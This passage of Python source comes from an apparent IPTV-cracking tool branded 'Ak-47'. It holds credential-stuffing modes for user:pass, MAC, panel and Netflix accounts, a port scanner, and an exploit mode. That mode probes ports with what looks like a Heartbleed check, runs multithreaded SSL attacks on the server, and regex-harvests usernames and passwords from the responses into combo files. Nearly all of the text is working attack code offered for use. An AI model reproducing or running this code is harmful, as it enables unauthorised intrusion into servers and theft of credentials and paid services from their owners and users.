                    e) + "\nInput data:" + data + Glb.RESET)
            return "", ""

    def ext_ReqEXTINF2(self, data: str) -> tuple:
        try:
            dataList = data.split("/")
            user = dataList[1]
            passw = dataList[2]
            return user, passw
        except Exception as e:
            if Glb.debug:
                print(Glb.RED + "Error processing extract_ReqEXTINF2:" + str(
                    e) + "\nInput data:" + data + Glb.RESET)
            return "", ""

    def doAnalyze(self):
        while True:
            if not Glb.dataToAnalyze.empty():
                data = Glb.dataToAnalyze.get()
                if data == "Stop Processing data":
                    break
                for patron in self.patronToSearch:
                    regexMatch = re.search(patron, data[1])
                    if regexMatch:
                        method_value = self.patronToSearch[patron]
                        credential = ([data[0], method_value(regexMatch.group(0))])
                        myCredential = f'{credential[1][0]}:{credential[1][1]}'
                        if myCredential not in Glb.credentialsToStorage:
                            Glb.credentialsToStorage.add(myCredential)
                            Glb.credentialsToProcess.put(myCredential)
            else:
                time.sleep(3)


class Utilities:

    def __init__(self):
        import m3u8 as m3u8_
        import requests as req
        self.m3u8_module = m3u8_
        self.req = req
        self.listHeaders = {'Accept': '*/*', 'Accept-Language': 'es', 'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
                            'Range': 'bytes=0-'}
        self.host = ""
        self.port = ""
        self.scheme = ""
        self.channelLinks = []

    def ext_channelFromM3U(self, m3ulink: str) -> list:
        try:
            m3ulink = m3ulink.replace("_plus", "")
            m3u8_obj = self.m3u8_module.load(m3ulink, headers=self.listHeaders)
            self.channelLinks = [el['uri'] for el in m3u8_obj.data['segments']]
        except Exception as err:
            print(Glb.RED, "Error getting the m3u:", str(err), Glb.RESET)
        finally:
            return self.channelLinks

    def ext_ServerFromCh(self, channel_urls: list) -> str:
        for channel in channel_urls:
            self.channelLinks.append(channel)
        for channel in self.channelLinks:
            try:
                resp = self.req.get(url=channel, stream=True, headers=self.listHeaders, allow_redirects=False,
                                    timeout=8)
                if 'Location' in resp.headers:
                    data = urlparse(resp.headers["Location"])
                    self.host = data.hostname
                    self.port = data.port
                    self.scheme = data.scheme
                    break
                else:  # public Ip is the same as private
                    self.host = urlparse(channel).hostname
                    self.port = urlparse(channel).port
                    self.scheme = urlparse(channel).scheme
                    break
            except Exception as err:
                print(Glb.RED, "Error getting the private Ip-Host:", str(err), Glb.RESET)
        return str(self.host)

    def getServerIP(self, m3ulink: str) -> str:
        channel_url = self.ext_channelFromM3U(m3ulink)
        if len(channel_url) > 0:
            return self.ext_ServerFromCh(channel_urls=[])


class PortScanner:

    def __init__(self):
        import requests as req
        self.http = req
        self.header = {
            "Host": "www.ipfingerprints.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/javascript,*/*; q=0.01",
            "Content-Type": f"application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
            "sec-ch-ua-platform": "\"Windows\"",
            "Origin": f"https://www.ipfingerprints.com",
            "Referer": f"https://www.ipfingerprints.com/portscan.php",
            "Accept-Language": "es-US,es-419;q=0.9,es;q=0.8",
            "Accept-Encoding": "gzip, deflate"
        }

    def portsToList(self, data: dict) -> list:
            infoList: list
            tcp_ports = []
            info = data['portScanInfo']
            infoList = info.split("\n")

            for item in infoList:
                if item.find("tcp") >= 0:
                    if item.find("open") >= 0:
                        pos = item.find("/")
                        tcp_ports.append(int(item[:pos]))
            return tcp_ports

    def createCoockiePanel(self, host: str, startPort: int, endPort: int) -> dict:
            coockieDat = {
                "remoteHost": host,
                "start_port": startPort,
                "end_port": endPort,
                "normalScan": "No",
                "scan_type": "connect",
                "ping_type": "tcp"
            }
            return coockieDat

    def searchOpenPorts_WEB(self, startPort: int, endPort: int, hostToScan: str) -> list:
            parameters = self.createCoockiePanel(hostToScan, startPort, endPort)
            openPorts = []
            count = 0
            while count < 2:
                try:
                    dat = self.http.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header,
                                         data=parameters,
                                         timeout=300)  # If in 300 seconds we do not have an answer, we cancel the request
                    openPorts = self.portsToList(dat.json())
                    return openPorts
                except self.http.Timeout as e:
                    count = count + 1
                    if count < 2:
                        print("Error detecting ports trying again:", e)
                    else:
                        print("Error detecting ports please use Local Method:", e)
                        break
                except Exception as e:
                    print("Error detecting open ports, please add your port manually")
                    break
            return openPorts

    def searchOpenPorts_LOCAL(self, host: str, ports: range) -> list:
        openPorts = []
        def isPortOpen(data):
            port, isOpen = data
            if isOpen:
                openPorts.append(port)
            return
        manager = ThreadPollManager(task_func=self.testPort_LOCAL, max_threads=400, hitlogger_fun=isPortOpen)
        result = manager.run([(host, port) for port in ports], demon=False)
        return openPorts

    def testPort_LOCAL(self, host: str, port: int) -> tuple:
        try:
            with socket(AF_INET, SOCK_STREAM) as sock:
                sock.settimeout(5)
                result = sock.connect_ex((host, port))
                if result == 0:
                    if Glb.debug:
                        print(f'Successful connection was made: {host}:{port}')
                    return port, True
                else:
                    return port, False
        except Exception as e:
            return port, False

class ExploitMain:

        def startExploitAttack(self, privatehost: str, port: int):
            print("Initiating attack on :" + privatehost + " port:" + str(port) + "\n")
            manager = ThreadPollManager(task_func=PanelAttackSsl().startAttack, max_threads=Glb.threadMain,
                                        hitlogger_fun=None, dataAnalizer_func=False, set_wait=False)
            result = manager.run(repeat((Glb.serverList[0], privatehost, port)), demon=True)

        def startAllComponents(self, privatehost: str, port: int):
            # Create threads for analyzing results base on totalMain threads
            exploit_threads = threading.Thread(target=self.startExploitAttack, args=(privatehost, port), daemon=True)
            exploit_threads.start()
            Glb.running = True
            for _ in range(0, max(int(round(Glb.threadMain * 0.01)), 1)):
                dataAnalyzer_thread = threading.Thread(target=DataAnalyzer().doAnalyze, daemon=True)
                dataAnalyzer_thread.start()
                Glb.actBots.append(dataAnalyzer_thread)

            userPass_thread = threading.Thread(target=self.userPassModule, daemon=True)
            userPass_thread.start()

            # Start Display thread
            Display().start_time()
            dsp_update = threading.Thread(target=Result().logger_iptv)
            dsp_update.start()

            for bot in Glb.actBots:
                bot.join()
            Glb.running = False
            return StartApp().all_done()

        def userPassModule(self):
            while True:
                credential = Glb.credentialsToProcess.get()
                if credential == "Stop Analyzing Results":
                    break
                if credential is not None:
                    path = os.path.join(Glb.myPath, 'Results Ak-47')
                    if Glb.exploit_mode == 'advanced':
                        if Glb.serverClientArea != '':
                            Modules().iptv_user_pass(data={'_data': credential}, customServers=Glb.serverClientArea)
                        else:
                            FileWork().file_write(path, credential, f'{urlparse(Glb.serverList[0]).hostname}_combo.txt',
                                                  'a+')
                        Glb.Hits += Glb.Hits
                        Glb.totalChecked = Glb.Hits
                    else:
                        Modules().iptv_user_pass({'_data': credential}, customServers=Glb.serverClientArea)
                        # FileWork().file_write(path, credential, f'{urlparse(Glb.serverList[0]).hostname}_combo.txt', 'a+')
                else:
                    time.sleep(5)

        def findIpVulPort(self, data: dict) -> list:
            # find a port to attack
            vulPorts = []
            flag = PanelAttackSsl()
            for realIp, Ports in data.items():
                for _Port in Ports:
                    try:
                        with (socket(AF_INET, SOCK_STREAM)) as s:
                            if flag.checkHB(url=realIp, port=_Port, sock=s):
                                vulPorts.append(_Port)
                                break
                    except Exception as e:
                        pass
            return vulPorts

        def startExploit(self):
            Clear().clr_all()

            Display().ak_set_title()

            Display().ak_heads()

            Display().ak_settings()

            if Glb.exploit_mode == 'standard':
                Display().loading_effect(True, 'Searching for private IP...')
                privateIp = Utilities().getServerIP(Glb.serverList[0])
                Display().loading_effect(False, 'Searching for private IP...')
                openPorts = PortScanner()
                if Glb.port_scanmode == 'web':
                    if privateIp is not None:
                        Display().loading_effect(True, f'Scanning ports with Web method:\n{privateIp} ...')
                        Glb.openPortsList = openPorts.searchOpenPorts_WEB(startPort=0, endPort=30000,
                                                                          hostToScan=privateIp)
                        Display().loading_effect(False, f'Scanning ports with Web method:\n{privateIp} ...')
                        print(f'Open Ports found for {privateIp} ', Glb.openPortsList)
                        if len(Glb.openPortsList) > 0:
                            vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                            if len(vulPorts) > 0:
                                Glb.portToAttack = vulPorts[0]
                                return self.startAllComponents(privatehost=privateIp,
                                                               port=vulPorts[0])  # only one port for now
                            else:
                                input(
                                    f'{Glb.RED}Unable to find any vulnerable port for {privateIp}, please use the advanced mode.{Glb.RESET}\n\nPlease press ENTER to continue')
                                return StartApp().re_startApp()
                        else:
                            input(
                                f'{Glb.RED}Unable to find any open port for {privateIp}, please use the advanced mode or Local port scan.{Glb.RESET}\nPlease press ENTER to continue{Glb.RESET}')
                            return StartApp().re_startApp()
                    else:
                        print(
                            f'{Glb.RED}Unable to find the private ip for {Glb.serverList[0]}, please make sure your m3u link is valid or use the advanced mode.{Glb.RESET}')
                        input('Please press ENTER to continue')
                        return StartApp().re_startApp()
                else:  # local port
                    if privateIp is not None:
                        Display().loading_effect(True, f'Scanning ports with Local method:\n{privateIp}...')
                        Glb.openPortsList = openPorts.searchOpenPorts_LOCAL(host=privateIp, ports=range(0, 30000))
                        Display().loading_effect(False, f'Scanning ports with Local method:\n{privateIp}...')
                        print(f'Open Ports found for {privateIp} ', Glb.openPortsList)
                        if len(Glb.openPortsList) > 0:
                            vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                            if len(vulPorts) > 0:
                                Glb.portToAttack = vulPorts[0]
                                return self.startAllComponents(privatehost=privateIp,
                                                               port=vulPorts[0])  # only one port for now
                            else:
                                input(
                                    f'{Glb.RED}Unable to find any vulnerable port for {privateIp}, please use the advanced mode.{Glb.RESET}wsdew\n\nPlease press ENTER to continue')
                                return StartApp().re_startApp()
                        else:
                            input(
                                f'{Glb.RED}Unable to find any open port for {privateIp}, please use the advanced mode.{Glb.RESET}\n\nPlease press ENTER to continue')
                            return StartApp().re_startApp()
                    else:
                        input(
                            f'{Glb.RED}Unable to find the private ip for {Glb.serverList[0]}, please make sure your m3u link is valid or use the advanced mode.{Glb.RESET}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()

            else:  # Advanced mode
                privateIp = str(urlparse(Glb.serverList[0]).hostname)
                port = urlparse(Glb.serverList[0]).port
                if port is None:
                    findOpenPorts = PortScanner()
                    Display().loading_effect(True,
                                             f'Scanning ports with Local method:\nthis process will take some time \nbecause you do not have a valid port \n {privateIp}...')
                    Glb.openPortsList = findOpenPorts.searchOpenPorts_LOCAL(host=privateIp, ports=range(0, 65535))
                    Display().loading_effect(False,
                                             f'Scanning ports with Local method:\nthis process will take some time \nbecause you do not have a valid port \n {privateIp}...')
                    print(f'Open Ports found for {privateIp} ', Glb.openPortsList)
                    Glb.openPortsList.append(443)
                    Glb.openPortsList.append(8443)
                    if len(Glb.openPortsList) < 1:
                        input(
                            f'{Glb.RED}Unable to find any open port for {privateIp}.{Glb.RESET}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()
                    vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                    if len(vulPorts) > 0:
                        Glb.portToAttack = vulPorts[0]
                        return self.startAllComponents(privatehost=privateIp, port=vulPorts[0])  # only one port for now
                    else:
                        input(
                            f'{Glb.RED}Unable to find any vulnerable port for {privateIp}, please try again.{Glb.RESET}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()
                else:
                    Glb.openPortsList.append(port)
                    vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                    if len(vulPorts) > 0:
                        return self.startAllComponents(privatehost=privateIp, port=port)
                    else:
                        input(
                            f'{Glb.RED}Sorry, I cannot establish a successful connection with {Glb.serverList[0]}, please try again.{Glb.RESET}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()

class InfoCollect:

        def scan_mode(self):
            Clear().muve_cursor(8)
            Clear().clr_from_cursor_to_end()
            scanModeInput = input(
                f' {Glb.RESET}Scan Mode Options: [ {Glb.GREEN}mac {Glb.RESET}, {Glb.GREEN}up {Glb.RESET}, {Glb.GREEN}panel {Glb.RESET}, {Glb.GREEN}channel {Glb.RESET}, {Glb.GREEN}exploit {Glb.RESET}]\n     Options details\n       {Glb.GREEN}up{Glb.RESET} = UserPass\n       {Glb.GREEN}mac{Glb.RESET} = Mac\n       {Glb.GREEN}panel{Glb.RESET} = XCode Panel\n       {Glb.GREEN}channel{Glb.RESET} = Channel Search\n       {Glb.GREEN}netflix{Glb.RESET} = netflix\n       {Glb.GREEN}ex{Glb.RESET} = exploit\n       {Glb.YELLOW}back{Glb.RESET} = go to previous selection\n       {Glb.RED}exit{Glb.RESET} = to close the program\n\n>>{Glb.BLUE_L} ')
            if scanModeInput == 'exit':
                return Display().cool_msg(scanModeInput)
            elif scanModeInput == 'back':
                print(f'{Glb.RED_L} This is the first instruction you can to go back, write exit \n to close the app{Glb.WHITE_L}')
                time.sleep(3)
                return self.scan_mode()
            elif scanModeInput == 'mac':
                Glb.scan_mode = scanModeInput
                return self.auto_mac()
            elif scanModeInput == 'up' or scanModeInput == 'panel' or scanModeInput == 'channel' or scanModeInput == 'netflix':
                Glb.scan_mode = scanModeInput
                return self.combo_file()
            elif scanModeInput == 'ex' or scanModeInput == 'exploit':
                Glb.scan_mode = 'exploit'
                return self.exploit_logic()
            else:
                Clear().muve_cursor(7)
                Clear().clr_from_cursor_to_end()
                print('{} Please write the correct scan mode {}'.format(Glb.RED_L, Glb.WHITE_L))
                return self.scan_mode()

        def auto_mac(self):
            macInput = input(
                f' {Glb.RESET}Do you want to generate MacAddress automatic? [ {Glb.GREEN}yes {Glb.RESET}or {Glb.GREEN}no {Glb.RESET}]: \n>>{Glb.BLUE_L}')
            if macInput == 'no':
                Glb.mac_auth = False
                return self.combo_file()
            elif macInput == 'yes':
                Glb.mac_auth = True
                return self.mac_rnd_seq()
            elif macInput == 'exit':
                return Display().cool_msg(macInput)
            elif macInput == 'back':
                Clear().muve_cursor(9)
                Clear().clr_from_cursor_to_end()
                return self.scan_mode()
            else:
                Clear().muve_cursor(17)
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}yes {}or {}no {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L, Glb.GREEN_L,
                                                                  Glb.WHITE_L))
                return self.auto_mac()

        def mac_rnd_seq(self):
            mac_type = input(
                f' {Glb.RESET}MacAddress Randon=> rnd or Sequential=> seq? [ {Glb.GREEN}rnd {Glb.RESET}or {Glb.GREEN}seq {Glb.RESET}]: \n>>{Glb.BLUE_L}')
            if mac_type == 'rnd':
                Glb.mac_rnd = True
                return self.pattern()

            elif mac_type == 'seq':
                Glb.mac_rnd = False
                return self.pattern()

            elif mac_type == 'exit':
                return Display().cool_msg(mac_type)

            elif mac_type == 'back':
                Clear().muve_cursor(9)
                Clear().clr_from_cursor_to_end()
                return self.auto_mac()

            else:
                Clear().muve_cursor(17)
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}rnd {}or {}seq {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L, Glb.GREEN_L,
                                                                   Glb.WHITE_L))
                return self.auto_mac()

        def pattern(self):
            macPattern = input(
                f' {Glb.RESET}Please enter desire start pattern \n[ Ex. {Glb.GREEN}00:1A:79: {Glb.RESET}or {Glb.GREEN}00:1A: {Glb.RESET}or {Glb.GREEN}00: {Glb.RESET}] \n>>{Glb.BLUE_L}')
            options = {'^[0-9A-Fa-f]$': 11, '^([0-9A-Fa-f]{2})$|^([0-9A-Fa-f]{2}[:])$': 10,
                       '^([0-9A-Fa-f]{2}[:][0-9A-Fa-f])$': 9,
                       '^([0-9A-Fa-f]{2}[:][0-9A-Fa-f]{2})$|^(([0-9A-Fa-f]{2}[:]){2})$': 8,
                       '^([0-9A-Fa-f]{2}[:]){2}[0-9A-Fa-f]$': 7,
                       '^(([0-9A-Fa-f]{2}[:]){2}[0-9A-Fa-f]{2})$|^(([0-9A-Fa-f]{2}[:]){3})$': 6,
                       '^(([0-9A-Fa-f]{2}[:]){3}[0-9A-Fa-f]{2})$|^(([0-9A-Fa-f]{2}[:]){4})$': 4,
                       '^([0-9A-Fa-f]{2}[:]){4}[0-9A-Fa-f]$': 3,
                       '^(([0-9A-Fa-f]{2}[:]){4}[0-9A-Fa-f]{2})$|^(([0-9A-Fa-f]{2}[:]){5})$': 2,
                       '^(([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f])$': 1}
            for key in options:
                if re.search(key, macPattern):
                    Glb.mac_fill = options[key]
                    Glb.mac_pattern = macPattern.replace(':', "")
                    Glb.combo_file_name = macPattern
                    return self.server_file()
            if macPattern == 'back':
                return self.auto_mac()
            elif macPattern == 'exit':
                return Display().cool_msg(macPattern)
            else:
                Clear().muve_cursor(18)
                Clear().clr_from_cursor_to_end()
                print('{} Please enter a valid pattern {}'.format(Glb.RED_L, Glb.WHITE_L))
                return self.pattern()

        def combo_file(self):
            Glb.comboList.clear()
            comboFileInput = input(f' {Glb.RESET}Enter combo file name: \n>>{Glb.BLUE_L}')
            if comboFileInput == 'exit':
                return Display().cool_msg(comboFileInput)
            elif comboFileInput == 'back':
                Clear().muve_cursor(9)
                Clear().clr_from_cursor_to_end()
                if Glb.scan_mode == 'mac':
                    func_ = self.auto_mac()
                else:
                    func_ = self.scan_mode()
                return func_
            elif Glb.scan_mode == 'mac':
                if re.match('(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))', comboFileInput):
                    Glb.comboList.append({'_data': comboFileInput})
                    return self.server_file()
            elif (Glb.scan_mode == 'up' or Glb.scan_mode == 'panel') and re.match('(.*:.*)', comboFileInput):
                Glb.comboList.append({'_data': comboFileInput})
                return self.server_file()
            elif Glb.scan_mode == 'netflix' and re.match('(.*:.*)', comboFileInput):
                Glb.comboList.append({'_data': comboFileInput})
                return self.proxy_logic()
            elif Glb.scan_mode == 'channel' and comboFileInput.count(':') > 0 and comboFileInput.count('/') == 0:
                user_inp = Parse().parse_btw_str(comboFileInput, 'range<', '>')
                if user_inp is not None:
                    user_inp2 = user_inp.split(':')
                    try:
                        minor = int(user_inp2[0])
                        mayor = int(user_inp2[1])
                        flag = mayor - minor
                        if flag > 0:
                            Glb.combo_length = flag
                            Glb.servers_file_name = f'<{minor} To {mayor}>'
                            Glb.channel_inter = (minor, mayor)
                            return self.server_file()
                        else:
                            raise ValueError
                    except ValueError as e:
                        Clear().muve_cursor(18)
                        Clear().clr_from_cursor_to_end()
                        print(
                            '{} Please use the fallowing format -> range<number1:number2> take in consideration that number2 should be greather than number1 {}'.format(
                                Glb.RED_L, Glb.WHITE_L))
                        del e
                        return self.combo_file()
                Glb.comboList.append({'_data': comboFileInput})
                return self.server_file()
            comboFileName = comboFileInput + '.txt'
            try:
                Glb.combo_length = FileWork().file_length(comboFileName)
                Glb.combo_path = comboFileName
                Glb.combo_file_name = comboFileInput
                return self.server_file()
            except OSError as e:
                try:
                    c_path_file = os.path.join(Glb.myPath, comboFileName)
                    Glb.combo_length = FileWork().file_length(c_path_file)
                    Glb.combo_path = c_path_file
                    Glb.combo_file_name = comboFileInput
                    return self.server_file()
                except OSError as e:
                    Clear().muve_cursor(18)
                    Clear().clr_from_cursor_to_end()
                    print('{} Wrong pattern or file do not exist {}'.format(Glb.RED_L, Glb.WHITE_L))
                    del e
                    return self.combo_file()

        def server_file(self):
            Glb.serverList.clear()
            if Glb.scan_mode == 'channel':
                help_ = f' {Glb.RESET}Please enter desire start pattern \n[Ex. {Glb.GREEN}http://127.0.0.0:8080/{Glb.RED}<var1>{Glb.GREEN}/index.m3u8 {Glb.RESET}or \n{Glb.GREEN}http://127.0.0.0:8080/{Glb.RED}<var1>{Glb.GREEN}/{Glb.RED}<var2>{Glb.GREEN}/index.m3u8 \n{Glb.RESET}] chars "{Glb.RED}< >{Glb.RESET}" means that words "var1" and "var2" will be \nreplaced according with your dictionary/wordlist \n>>{Glb.BLUE_L}'
            else:
                help_ = f' {Glb.RESET}Enter server file name or url: \n>>{Glb.BLUE_L}'
            serversFileInput = input(help_)
            if serversFileInput == 'exit':
                return Display().cool_msg(serversFileInput)
            elif serversFileInput == 'back':
                if Glb.mac_auth is True:
                    return self.pattern()
                else:
                    return self.combo_file()
            elif serversFileInput.count('://') == 1:
                Glb.serverList.append(serversFileInput)
                Glb.servers_length = len(Glb.serverList)
                Glb.servers_file_name = serversFileInput
                if Glb.scan_mode == 'up':
                    return self.user_agent()
                return self.proxy_logic()
            serverFileName = serversFileInput + '.txt'
            try:
                Glb.servers_length = FileWork().file_length(serverFileName)
                Glb.servers_path = serverFileName
                Glb.servers_file_name = serversFileInput
                if Glb.scan_mode == 'up':
                    return self.user_agent()
                return self.proxy_logic()
            except Exception as e:
                try:
                    s_path_file = os.path.join(Glb.myPath, serverFileName)
                    Glb.servers_length = FileWork().file_length(s_path_file)
                    Glb.servers_path = s_path_file
                    Glb.servers_file_name = serversFileInput
                    if Glb.scan_mode == 'up':
                        return self.user_agent()
                    return self.proxy_logic()
                except Exception as e:
                    Clear().muve_cursor(19)
                    Clear().clr_from_cursor_to_end()
                    print('{} Wrong name or file do not exist {}'.format(Glb.RED_L, Glb.WHITE_L))
                    del e
                    return self.server_file()

        def user_agent(self):
            userAgentInput = input(
                f' {Glb.RESET}Please enter your custom User-Agent or leave it empty for default : \n>>{Glb.BLUE_L}')
            if userAgentInput == 'exit':
                return Display().cool_msg(userAgentInput)
            elif userAgentInput == 'back':
                return self.server_file()
            else:
                Glb.userAgent = userAgentInput
            return self.proxy_logic()

        def proxy_logic(self):
            useProxyInput = input(
                f' {Glb.RESET}Do you want to use proxy? [ {Glb.GREEN}yes {Glb.RESET}or {Glb.GREEN}no {Glb.RESET}]: \n>>{Glb.BLUE_L}')
            if useProxyInput == 'yes':
                Glb.useProxy = useProxyInput
                return self.proxy_free()
            elif useProxyInput == 'no':
                Glb.useProxy = useProxyInput
                Glb.proxyList.clear()
                return self.thread_number()
            elif useProxyInput == 'back':
                if Glb.scan_mode == 'netflix':
                    return self.combo_file()
                else:
                    return self.server_file()
            elif useProxyInput == 'exit':
                return Display().cool_msg(useProxyInput)
            else:
                Clear().muve_cursor(21)
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}yes {}or {}no {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L, Glb.GREEN_L,
                                                                  Glb.WHITE_L))
                return self.proxy_logic()

        def proxy_free(self):
            freeProxyInput = input(
                f' {Glb.RESET}Do you want to use {Glb.GREEN}FREE{Glb.RESET} proxies? [ {Glb.GREEN}yes {Glb.RESET}or {Glb.GREEN}no {Glb.RESET}]: \n>>{Glb.BLUE_L}')
            if freeProxyInput == 'yes':
                Glb.useFreeProxies = freeProxyInput
                Glb.proxy_file_name = 'FREE'
                return self.proxy_type()
            elif freeProxyInput == 'no':
                Glb.useFreeProxies = freeProxyInput
                Glb.proxyList.clear()
                return self.proxy_file()
            elif freeProxyInput == 'back':
                if Glb.scan_mode == 'netflix':
                    return self.combo_file()
                else:
                    return self.proxy_logic()
            elif freeProxyInput == 'exit':
                return Display().cool_msg(freeProxyInput)
            else:
                Clear().muve_cursor(22)
                Clear().clr_from_cursor_to_end()
                print(
                    '{} Please write {}yes {}or {}no {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L,
                                                                Glb.GREEN_L, Glb.WHITE_L))
                return self.proxy_free()

        def proxy_file(self):
            proxyFileNameInput = input(f' {Glb.RESET}Enter proxy file name: \n>>{Glb.BLUE_L}')
            if proxyFileNameInput == 'exit':
                return Display().cool_msg(proxyFileNameInput)
            elif proxyFileNameInput == 'back':
                return self.proxy_logic()
            proxyFileName = proxyFileNameInput + '.txt'
            try:
                Glb.proxy_length = FileWork().file_length(proxyFileName)
                Glb.proxy_path = proxyFileName
                Glb.proxy_file_name = proxyFileNameInput
                return self.proxy_type()
            except Exception as e:
                try:
                    p_path_file = os.path.join(Glb.myPath, proxyFileName)
                    Glb.proxy_length = FileWork().file_length(p_path_file)
                    Glb.proxy_path = p_path_file
                    Glb.proxy_file_name = proxyFileNameInput
                    return self.proxy_type()
                except Exception as e:
                    Clear().muve_cursor(23)
                    Clear().clr_from_cursor_to_end()
                    print('{} Wrong name or file do not exist {}'.format(Glb.RED_L, Glb.WHITE_L))
                    del e
                    return self.proxy_file()

        def proxy_type(self):
            proxyTypeInput = input(
                f' {Glb.RESET}Enter Proxy Type [ {Glb.GREEN}http {Glb.RESET}or {Glb.GREEN}socks4 {Glb.RESET}or {Glb.GREEN}socks5 {Glb.RESET}]: \n>>{Glb.BLUE_L}')
            if proxyTypeInput == 'http' or proxyTypeInput == 'socks4' or proxyTypeInput == 'socks5':
                Glb.proxy_type = proxyTypeInput
                return self.thread_number()
            elif proxyTypeInput == 'exit':
                return Display().cool_msg(proxyTypeInput)
            elif proxyTypeInput == 'back':
                if Glb.useFreeProxies == 'yes':
                    return self.proxy_free()
                else:
                    return self.proxy_file()
            else:
                Clear().muve_cursor(24)
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}http{}, {}socks4 {}or {}socks5 {}'.format(Glb.RED_L, Glb.GREEN_L,
                                                                                   Glb.WHITE_L,
                                                                                   Glb.GREEN_L,
                                                                                   Glb.WHITE_L,
                                                                                   Glb.GREEN_L,
                                                                                   Glb.WHITE_L))
                return self.proxy_type()

        def exploit_logic(self):
            exploitOptions = input(
                f' {Glb.RESET}Please enter your scan type  \n {Glb.GREEN}1 {Glb.RESET}- standard, it only need a valid m3u link \nex.(http://myserver.com/get.php?username=USERNAME&password=PASSWORD&type=m3u) \n{Glb.GREEN} 2{Glb.RESET} - advanced \n>>{Glb.BLUE_L}')
            if exploitOptions == '1' or exploitOptions == 'standard':
                inputData = input(
                    f' {Glb.RESET}Please enter your m3u list url  \n[ Ex. {Glb.GREEN}http://myserver.com/get.php?username=USERNAME&password=PASSWORD&type=m3u {Glb.RESET}] \n>>{Glb.BLUE_L}')
                m3ulist = re.match(
                    r'((?:https?:\/\/(?:[\w-]+\.)*[\w-]+(?:\:\d+)?(?:/[^\s]*)?)/get\.php\?username=[^&]+\&password=[^&]+&type=m3u)',
                    inputData)
                if m3ulist is not None:
                    m3ulist = m3ulist.group()
                    Glb.exploit_mode = 'standard'
                    Glb.serverClientArea = (f'{urlparse(m3ulist).scheme}://{urlparse(m3ulist).netloc}')
                    Glb.serverList.clear()
                    Glb.serverList.append(m3ulist)
                    Glb.servers_length = len(Glb.serverList)
                    Glb.servers_file_name = Glb.serverClientArea

                    def exploit_port():
                        inputPortScan = input(
                            f' {Glb.RESET}Please select the port scan mode\n{Glb.GREEN} 1 {Glb.RESET} - Web, this could be faster but it may also fail.\n{Glb.GREEN} 2 {Glb.RESET} - Local, this may be slow but accurate.\n>>{Glb.BLUE_L}')
                        if inputPortScan == '1' or inputPortScan in 'web':
                            Glb.port_scanmode = 'web'
                            return self.thread_number()
                        elif inputPortScan == '2' or inputPortScan in 'local':
                            Glb.port_scanmode = 'local'
                            return self.thread_number()
                        elif inputPortScan == 'back':
                            Clear().muve_cursor(9)
                            Clear().clr_from_cursor_to_end()
                            return self.exploit_logic()
                        elif inputPortScan == 'exit':
                            return Display().cool_msg(exploitOptions)
                        else:
                            Clear().muve_cursor(9)
                            Clear().clr_from_cursor_to_end()
                            print(
                                f'Please enter a valid selection {Glb.GREEN}1{Glb.RESET} for (Web) or {Glb.GREEN}2{Glb.RESET} for (Local)\n>>{Glb.BLUE_L}')
                            return exploit_port()

                    return exploit_port()

                elif exploitOptions == 'back':
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    return self.exploit_logic()
                elif exploitOptions == 'exit':
                    return Display().cool_msg(exploitOptions)
                else:
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    print('{} Please enter a valid m3u link or write exit or back{}'.format(Glb.RED_L, Glb.WHITE_L))
                    return self.exploit_logic()

            elif exploitOptions == '2' or exploitOptions == 'advanced':
                inputData = input(
                    f' {Glb.RESET}Please enter your server and port  \n[ Ex. {Glb.GREEN}http://myserver.com:8080 {Glb.RESET}] \n>>{Glb.BLUE_L}')
                serverPort = re.match(
                    r'(https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b|https?://(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?::\d{1,5})?\b)',
                    inputData)
                if serverPort is not None:
                    serverPort = serverPort.group()
                    Glb.exploit_mode = 'advanced'
                    Glb.serverList.clear()
                    Glb.serverList.append(serverPort)
                    # inputData = input(f' {Glb.RESET}Please enter the client-area url if any.{Glb.RESET}] \n>>{Glb.BLUE_L}')
                    Glb.serverClientArea = f'{urlparse(serverPort).scheme}://{urlparse(serverPort).netloc}'
                    Glb.servers_length = len(Glb.serverList)
                    Glb.servers_file_name = Glb.serverClientArea
                    return self.thread_number()
                elif inputData == 'back':
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    return self.exploit_logic()
                elif inputData == 'exit':
                    return Display().cool_msg(exploitOptions)
                else:
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    print('{} Please enter a valid url:port format ex. https://myserver.net:8080 {}'.format(Glb.RED_L,
                                                                                                            Glb.WHITE_L))
                    return self.exploit_logic()

            elif exploitOptions == 'back':
                Clear().muve_cursor(9)
                Clear().clr_from_cursor_to_end()
                return self.scan_mode()
            elif exploitOptions == 'exit':
                return Display().cool_msg(exploitOptions)
            else:
                Clear().muve_cursor(9)
                Clear().clr_from_cursor_to_end()
                print('{} Please enter a valid scan type {}'.format(Glb.RED_L, Glb.WHITE_L))
                return self.exploit_logic()

        def thread_number(self):
            print(f'{Glb.YELLOW}Maximum treads recommend according to your system--> {os.cpu_count() * 20} {Glb.RESET}')
